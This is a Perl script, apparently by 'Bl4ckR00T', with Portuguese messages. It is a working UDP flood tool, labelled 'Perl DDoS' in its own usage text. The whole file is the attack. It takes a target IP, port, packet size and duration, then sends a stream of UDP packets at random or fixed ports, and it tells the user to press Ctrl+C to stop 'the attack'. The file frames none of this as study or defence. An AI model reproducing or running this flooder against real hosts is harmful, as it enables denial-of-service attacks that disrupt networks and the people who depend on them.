#!/usr/bin/perl
#Script Perl Feito por Bl4ckR00T

use Socket;
use strict;
use Getopt::Long;
use Time::HiRes qw( usleep gettimeofday ) ;

print '
+----------------------------------------------------------------------------------+
|               |$$$$$$      |$$$$$$         $$$$$        /$$$$$$|                 |
|               |$$    $$|   |$$    $$|   |$$     $$|    |$$|                      |
|               |$$    $$|   |$$    $$|   |$$     $$|     \$$$$$\                  |
|               |$$    $$|   |$$    $$|   |$$     $$|         |$$|                 |
|               |$$$$$$$     |$$$$$$         $$$$$       |$$$$$$/                  |
+----------------------------------------------------------------------------------+
';
print "\n";
 

if ($#ARGV != 3) {
  print " \n";
  print "Perl DDoS Feito por: Bl4ckR00T HackerConection \n\n";
  print "Comando correto: perl dedos.pl <ip> <port> <pacotes> <temps(em segundos)>\n";
  exit(1);
}

our $port = 0;
our $size = 0;
our $time = 0;
our $bw   = 0;
our $help = 0;
our $delay= 0;

GetOptions(
	"port=i" => \$port,	
	"size=i" => \$size,		
	"bandwidth=i" => \$bw,	
	"time=i" => \$time,		
	"delay=f"=> \$delay,	
	"help|?" => \$help);		
	
if ($bw && $delay) {
  print "AVISO: calculado tamanho do pacote substitui o parâmetro --size ignorado\n";
  $size = int($bw * $delay / 8);
} elsif ($bw) {
  $delay = (8 * $size) / $bw;
}

$size = 256 if $bw && !$size;

($bw = int($size / $delay * 8)) if ($delay && $size);

my ($ip,$port,$size,$time) = @ARGV;
my ($iaddr,$endtime,$psize,$pport);
$iaddr = inet_aton("$ip") or die "IP inválido $ip\n";
$endtime = time() + ($time ? $time : 1000000);
socket(flood, PF_INET, SOCK_DGRAM, 17);

print "Pacotando IP e Porta $ip " . ($port ? $port : "random") . " com " . 
  ($size ? "$size-byte" : "random size") . " pacotes" . 
  ($time ? " por $time segundos" : "") . "\n";
print "Pare o ataque pressionando Ctrl + C\n" unless $time;

die "Tamanho do pacote inválida solicitada: $size\n" if $size && ($size < 64 || $size > 65000);
$size -= 28 if $size;
for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1500-64)+64) ;
  $pport = $port ? $port : int(rand(65500))+1;

  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));

}